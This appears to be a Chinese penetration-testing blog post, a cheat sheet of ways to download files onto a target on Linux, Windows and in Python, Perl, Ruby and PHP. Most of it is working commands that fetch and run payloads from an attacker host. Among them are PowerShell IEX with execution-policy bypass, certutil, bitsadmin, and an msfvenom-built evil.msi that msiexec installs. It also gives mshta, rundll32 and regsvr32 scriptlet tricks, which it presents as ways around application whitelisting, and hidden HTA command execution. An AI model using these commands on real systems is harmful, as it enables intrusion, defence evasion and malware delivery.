                                <img title="multi-ways-file-download" alt="multi-ways-file-download"
                                     src="/images/default.jpg"></img>
                            
                        </div>
                        <div class="content-warp flex1 flex flex-v">
                            <div class="title">&lt; multi-ways-file-download &gt;</div>
                            <div class="content flex1">
                                
  这里我分为三个模块：Linux、Windows、常见语言环境
#Linux#
1、curlcurl -O http://xx.xx.xx.xx/filename 
curl http://xx.xx.xx.xx/filename  -o path/filename2、wgetwget http://xx.xx.xx.xx/filename  [-o path/filename]3、nc3.1、发送方主动连接目标机器接收方先执行命令
发送方：
nc -w 3 [destination] 1234 &lt; out.file
接收方:
nc -l -p 1234 &gt; out.file3.2、目标机器主动连接发送方cat file | nc -l 1234   ###发送方将文件内容打印到本地1234端口，接收方访问1234端口接收文件
nc  launcher_ip 1234 &gt; file  ####接收方4、利用linux自带base64命令本地将(可执行)文件转换为base64
python -c &apos;print(__import__(&quot;base64&quot;).b64encode(open(&quot;file&quot;, &quot;rb&quot;).read()))&apos;目标机器执行：
echo &quot;strings&quot; | base64 -d &gt; out.file5、SCPscp username@servername:/path/filename /tmp/local_destination当然，windows有ssh的也可以使用，只是Linux一般比较多
Windows1、Powershell1.1、IEX调用WebClient[1]
IEX(New-Object System.Net.WebClient).DownloadFile($url, $output)   ####下载[2]    
powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://10.10.14.67:8000/PowerUp.ps1&apos;); Invoke-AllChecks&quot; ##加载PS1到内存并执行1.2、WebRequest下载：Invoke-WebRequest  （-Uri） http://10.10.14.67:8000/procdump.exe -outfile ./procdump.exe  ###cmd下前面加powershell1.3、BitsTransferStart-BitsTransfer -Source $url -Destination $output  ###cmd下前面加powershell2、SMB2.1、powershellCopy-Item -Source \\10.10.101.222\share\xxx.exe -Destination C:\path\2.2、CMDcopy \\10.10.101.222\share\xxx.exe或者
Robocopy : https://www.microsoft.com/en-us/download/details.aspx?id=176573、CURL高版本windows自带
curl -O  http://10.10.101.222:8000/xxx.exe
culr  http://10.10.101.222:8000/xxx.exe -o C:/tmp/xxx.exe 4、FTPecho open 10.10.101.222 21&gt; ftp.txt
echo ftp&gt;&gt; ftp.txt
echo bin &gt;&gt; ftp.txt
echo ftp&gt;&gt; ftp.txt
echo GET xxx.exe &gt;&gt; ftp.txt
ftp -s:ftp.txt或交互式shell情况下直接ftp登录到攻击机(开启ftp) get filename（linux开启ftp同样适用）
5、VBS5.1、.vbs文件内容Set Post = CreateObject(&quot;Msxml2.XMLHTTP&quot;)
Set Shell = CreateObject(&quot;Wscript.Shell&quot;)
Post.Open &quot;GET&quot;,&quot;http://10.10.101.222:8000/xxx.exe&quot;,0
Post.Send()
Set aGet = CreateObject(&quot;ADODB.Stream&quot;)
aGet.Mode = 3
aGet.Type = 1
aGet.Open()
aGet.Write(Post.responseBody)
aGet.SaveToFile &quot;C:\test\update\xxx.exe&quot;,25.2、CMD下执行echo Set Post = CreateObject(&quot;Msxml2.XMLHTTP&quot;) &gt;&gt;download.vbs
echo Set Shell = CreateObject(&quot;Wscript.Shell&quot;) &gt;&gt;download.vbs
echo Post.Open &quot;GET&quot;,&quot;http://10.10.101.222:8000/xxx.exe&quot;,0 &gt;&gt;download.vbs
echo Post.Send() &gt;&gt;download.vbs
echo Set aGet = CreateObject(&quot;ADODB.Stream&quot;) &gt;&gt;download.vbs
echo aGet.Mode = 3 &gt;&gt;download.vbs
echo aGet.Type = 1 &gt;&gt;download.vbs
echo aGet.Open() &gt;&gt;download.vbs
echo aGet.Write(Post.responseBody) &gt;&gt;download.vbs
echo aGet.SaveToFile &quot;C:\tmp\xxx.exe&quot;,2 &gt;&gt;download.vbs5.3、wget.vbson error resume next
iLocal=LCase(Wscript.Arguments(1))
iRemote=LCase(Wscript.Arguments(0))
iUser=LCase(Wscript.Arguments(2))
iPass=LCase(Wscript.Arguments(3))
set xPost=CreateObject(&quot;Microsoft.XMLHTTP&quot;)
if iUser=&quot;&quot; and iPass=&quot;&quot; then
xPost.Open &quot;GET&quot;,iRemote,0
else
xPost.Open &quot;GET&quot;,iRemote,0,iUser,iPass
end if
xPost.Send()
set sGet=CreateObject(&quot;ADODB.Stream&quot;)
sGet.Mode=3
sGet.Type=1
sGet.Open()
sGet.Write xPost.ResponseBody
sGet.SaveToFile iLocal,2cscript wget.vbs http://10.10.101.222:8000/xxx.exe
6、CSC.exeCSC.exe是windows自带的C#编译器CSC.exe路径需要绝对路径，且路径根据.net版本而定download.cs：（利用echo依次写入如下内容）
using System.Net;
namespace downloader
{
    class Program
    {
    static void Main(string[] args)
    {
        WebClient client = new WebClient();
        string URLAddress = @&quot;http://10.10.101.222:8000/xxx.exe&quot;;
        string receivePath = @&quot;C:\tmp\&quot;;
        client.DownloadFile(URLAddress, receivePath + System.IO.Path.GetFileName
(URLAddress));
    }
 }
}执行：C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /out:C:\tmp\download.exe C:\tmp\download.cs
7、记事本文件下载notepad中:打开–&gt;输入URL （win10 不支持？？？）
8、JScript下载.js文件内容
var Object = WScript.CreateObject(&quot;MSXML2.XMLHTTP&quot;);
Object.open(&quot;GET&quot;,&quot;http://10.10.101.222:8000/xxx.exe&quot;,false);
Object.send();
if (Object.Status == 200)
{
   var Stream = WScript.CreateObject(&quot;ADODB.Stream&quot;);
   Stream.Open();
   Stream.Type = 1;
   Stream.Write(Object.ResponseBody);
   Stream.SaveToFile(&quot;C:\\tmp\\xxx.exe&quot;, 2);
Stream.Close();
}执行： node download.js或合并成一句话形式：也就是rundll32
rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();Object=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);Object.open(&quot;GET&quot;,&quot;http://10.10.101.222:8000/xxx.exe&quot;,false);Object.send();if(Object.Status==200){Stream=new ActiveXObject(&quot;ADODB.Stream&quot;);Stream.Open();Stream.Type=1;Stream.Write(Object.ResponseBody);Stream.SaveToFile(&quot;C:\\tmp\\xxx.exe&quot;,2);Stream.Close();}9、bitsadmin不支持https,ftp协议，使用SimpleHttpServer会报错
bitsadmin /transfer n http://10.10.101.222:8000\xxx.exe  C:\tmp\xxx.exe10、Certutilcertutil.exe -urlcache -split -f http://10.10.101.222:8000/xxx.exe xxx.exe  ###下载文件
certutil -urlcache -split -f http://10.10.101.222:8000/xxx.exe delete   ###删除缓存11、msiexec  （远程执行）https://www.hackingarticles.in/bypass-application-whitelisting-using-msiexec-exe-multiple-methods/
msfvenom -p windows/exec CMD=cmd.exe -f msi &gt; evil.msi
msiexec /q /i http://10.10.101.222:8000/evil.msi12、IEExecC:\Windows\Microsoft.NET\Framework\v2.0.50727&gt; caspol -s off   ####需管理员身份
C:\Windows\Microsoft.NET\Framework\v2.0.50727&gt; IEExec http://10.10.101.222:8000/xxx.exe13、mshtamshta http://10.10.101.222/run.htarun.hta
&lt;HTML&gt; 
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt; 
&lt;HEAD&gt; 
&lt;script language=&quot;VBScript&quot;&gt; Window.ReSizeTo 0, 0 Window.moveTo -2000,-2000 Set objShell = CreateObject(&quot;Wscript.Shell&quot;) objShell.Run &quot;cmd.exe /c net user&quot; // 这里填写命令 
self.close &lt;/script&gt; 
    &lt;body&gt; demo &lt;/body&gt; 
&lt;/HEAD&gt;
&lt;/HTML&gt;14、rundll32rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();Object=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);Object.open(&quot;GET&quot;,&quot;http://10.10.101.222:8000/xxx.exe&quot;,false);Object.send();if(Object.Status==200){Stream=new ActiveXObject(&quot;ADODB.Stream&quot;);Stream.Open();Stream.Type=1;Stream.Write(Object.ResponseBody);Stream.SaveToFile(&quot;C:\\tmp\\xxx.exe&quot;,2);Stream.Close();}15、regsvr32：https://www.hackingarticles.in/bypass-application-whitelisting-using-regsrv32-exe-multiple-methods/
regsvr32 /u /s /i:http://10.10.101.222:8000/run.sct scrobj.dllrun.sct:
&lt;?XML version=&quot;1.0&quot;?&gt; 
&lt;scriptlet&gt; 
&lt;registration     
    progid=&quot;ShortJSRAT&quot;     
    classid=&quot;{10001111-0000-0000-0000-0000FEEDACDC}&quot; &gt;     
    &lt;!-- Learn from Casey Smith @subTee --&gt;     
    &lt;script language=&quot;JScript&quot;&gt;         
        &lt;![CDATA[             
            ps  = &quot;cmd.exe /c calc.exe&quot;;   ####命令执行          
            new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps,0,true);         
            ]]&gt; 
&lt;/script&gt; 
&lt;/registration&gt;
&lt;/scriptlet&gt;常见编程环境下载Python1、命令行版本python -c &quot;import urllib2;u=urllib2.urlopen(&quot;http://xx.xxx.xx/filename&quot;);localfile=open(&apos;c:\tmp\filename&apos;,&apos;w&apos;);localfile.write(u.read());localfile.close();&quot;2、脚本执行版本#!python
#!/usr/bin/python
import urllib2
u = urllib2.urlopen(&apos;http://domain/file&apos;)
localFile = open(&apos;local_file&apos;, &apos;w&apos;)    
localFile.write(u.read())
localFile.close()kali@kali:~# python test.py
3、通过python脚本构造任意文件上传页面： https://0day.work/finding-an-arbitrary-file-upload-vulnerability-in-a-filesharing-script/
Perl1、命令行版本perl -MLWP::Simple -e &apos;getstore (&quot;http://xx.xx.xx.xx/filename&quot;,&quot;filename&quot;)&apos;2、脚本执行
#!/usr/bin/perl
use LWP::Simple;
getstore(&quot;http://domain/file&quot;, &quot;file&quot;);kali@kali:~# perl test.pl
Ruby#!ruby
#!/usr/bin/ruby
require &apos;net/http&apos;
Net::HTTP.start(&quot;www.domain.com&quot;) { |http|
r = http.get(&quot;/file&quot;)
open(&quot;save_location&quot;, &quot;wb&quot;) { |file|
file.write(r.body)
}
}kali@kali:~# ruby test.rb
PHP1、命令行
php -r &apos;$data = @file(&quot;http://10.10.14.67:8000/winPEAS.exe&quot;);$f = fopen(&quot;/tmp/winPEAS.exe&quot;, &quot;w&quot;);fwrite($f, $data[0]);fclose($f);&apos;2、脚本执行
&lt;?php 
$data = @file(&quot;http://10.10.14.67:8000/winPEAS.exe&quot;);
$f = fopen(&quot;/tmp/winPEAS.exe&quot;, &quot;w&quot;);
fwrite($f, $data[0]);
fclose($f);?&gt;kali@kali:~# php test.php



                            </div>
                            <div class="post-tags">
                                
                            </div>
                            <div class="other">
                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
                                <span><i class="iconfont icon-shijian"></i>Apr 19, 2020</span>
                            </div>
                        </div>
                    </a>
                


            </div>
            <div class="swiper-scrollbar"></div>
        </div>
    </div>
</div>
<script>

    function getSwiperPrams() {
        var windowsWidth = $(document).width()
        var slidesPerView
        var direction;
        if(windowsWidth > 1500){
            direction = 'horizontal'
            slidesPerView = 4
        }else if(windowsWidth > 1100){
            direction = 'horizontal'
            slidesPerView = 3
        }else if(windowsWidth > 1000){
            direction = 'horizontal'
            slidesPerView = 2
        }else{
            slidesPerView = 1
            direction = 'vertical'
        }
        return {
            direction: direction,
            slidesPerView: slidesPerView
        }
    }
    var params = getSwiperPrams()

  var mySwiper = new Swiper('.swiper-container', {
    direction: params.direction, // 垂直切换选项
    mousewheel: true,
    slidesPerView: params.slidesPerView,
    spaceBetween: 30,
    scrollbar: {
      el: '.swiper-scrollbar'
    },
    on: {
        resize: function(){

        },
    },

    // 如果需要滚动条
    scrollbar: {
      el: '.swiper-scrollbar',
    },
  })
</script>

  </div>
  <!--
  <div class="main-bottom">
    <div class="music flex flex-pack-justify flex-align-center">
      <div class="control">
        <a onclick="preSong()"><span class="iconfont icon-shangyishou"></span></a>
        <a onclick="playControl()"><span class="iconfont play-icon icon-kaishi1"></span></a>
        <a onclick="nextSong()"><span class="iconfont icon-xiayishou-copy"></span></a>
      </div>
      <div class="msg">
        <span class="time"></span>
        <div class="line" ref="progress-line-warp">
          <div class="song-msg">周杰伦 - 说好不哭</div>
          <!--<div class="current-line" ref="progress-line">
            <a tag="a" class="target" v-on:mousedown.prevent="mousedown"></a>
          </div>-->
        </div>
        <span class="all-time"></span>
      </div>
      <div class="right-control">
        <a class="order-btn flex flex-align-center" onclick="toogleShowMusicList()">
          <span class="iconfont icon-ttpodicon"></span>
          <span class="number flex1">3</span>
        </a>
      </div>
      <audio id="audio" class="mian-audio" src="https://callmesoul-blog.oss-cn-shenzhen.aliyuncs.com/music/%E5%91%A8%E6%9D%B0%E4%BC%A6%20-%20%E8%AF%B4%E5%A5%BD%E4%B8%8D%E5%93%AD.mp3">
        Your browser does not support the audio element.
      </audio>
    </div>
  </div>
  <div class="music-list">
    <div id="musiclist">
      
        <a class="music-item flex flex-align-center" data-name="周杰伦 - 说好不哭" data-url="https://callmesoul-blog.oss-cn-shenzhen.aliyuncs.com/music/%E5%91%A8%E6%9D%B0%E4%BC%A6%20-%20%E8%AF%B4%E5%A5%BD%E4%B8%8D%E5%93%AD.mp3" onclick="changePlayIndex(0)" >
          <span class="iconfont" class="icon-kaishi"></span>
          <span class="title flex1">说好不哭 - 周杰伦</span>
        </a>
      
        <a class="music-item flex flex-align-center" data-name="周杰伦 - 爱在西元前" data-url="https://callmesoul-blog.oss-cn-shenzhen.aliyuncs.com/music/%E5%91%A8%E6%9D%B0%E4%BC%A6%20-%20%E7%88%B1%E5%9C%A8%E8%A5%BF%E5%85%83%E5%89%8D%20%5Bmqms2%5D.mp3" onclick="changePlayIndex(1)" >
          <span class="iconfont" class="icon-kaishi"></span>
          <span class="title flex1">爱在西元前 - 周杰伦</span>
        </a>
      
        <a class="music-item flex flex-align-center" data-name="周杰伦 - 龙拳" data-url="https://callmesoul-blog.oss-cn-shenzhen.aliyuncs.com/music/%E5%91%A8%E6%9D%B0%E4%BC%A6%20-%20%E9%BE%99%E6%8B%B3%20%5Bmqms2%5D.mp3" onclick="changePlayIndex(2)" >
          <span class="iconfont" class="icon-kaishi"></span>
          <span class="title flex1">龙拳 - 周杰伦</span>
        </a>
      
    </div>
  </div>
</div>

<script>
  var playIndex = localStorage.getItem('playIndex') ? parseInt(localStorage.getItem('playIndex')) : 0
  let musics = $('.music-item')
  musics.eq(playIndex).addClass('active')
  var audio = document.getElementById("audio");

  $('.song-msg').html(musics[playIndex].dataset.name)
  audio.src = musics[playIndex].dataset.url


  var playbtn = document.getElementsByClassName("play-icon")[0];
  var playing = false;
  audio.loop = false;
  audio.addEventListener('ended', function () {
    playbtn.classList.remove("icon-kaishi")
    playbtn.classList.add("icon-kaishi1")
    playing = false
  }, false);
  audio.addEventListener('play', function () {
    playbtn.classList.remove("icon-kaishi1")
    playbtn.classList.add("icon-kaishi")
    playing= true
  }, false);
  audio.addEventListener('pause', function () {
    playbtn.classList.remove("icon-kaishi")
    playbtn.classList.add("icon-kaishi1")
    playing = false
  }, false);
  function toogleShowMusicList() {
    var musiclist = document.getElementsByClassName("music-list")[0];
    if(musiclist.className.indexOf("active") === -1){
      musiclist.classList.add("active")
    }else{
      musiclist.classList.remove("active");
    }
  }

  function playControl() {
    if(playing){
      audio.pause()
    }else{
      audio.play()
    }
  }

  function changePlayIndex(index) {
    if(playIndex !== index){
      localStorage.setItem('playIndex',index)
      playIndex = index
      musics.removeClass('active')
      musics.eq(playIndex).addClass('active')
      $('.song-msg').html(musics[playIndex].dataset.name)
      audio.src = musics[playIndex].dataset.url
      audio.play()
    }else{
      playControl()
    }
  }

  function preSong() {
    var index
    if(playIndex === 0){
      index = musics.length - 1
    }else{
      index = playIndex - 1
    }
    changePlayIndex(index)
  }

  function nextSong() {
    var index
    if(playIndex === musics.length - 1){
      index = 0
    }else{
      index = playIndex + 1
    }
    changePlayIndex(index)
  }
-->
  function toggleMenu() {
    var mainLeft = $('.main-left')
    if(mainLeft.hasClass('active')){
      mainLeft.removeClass('active')
      $('.menu').removeClass('icon-close')
      $('.menu').addClass('icon-menu')
    }else{
      mainLeft.addClass('active')
      $('.menu').removeClass('icon-menu')
      $('.menu').addClass('icon-close')
    }
  }
</script>
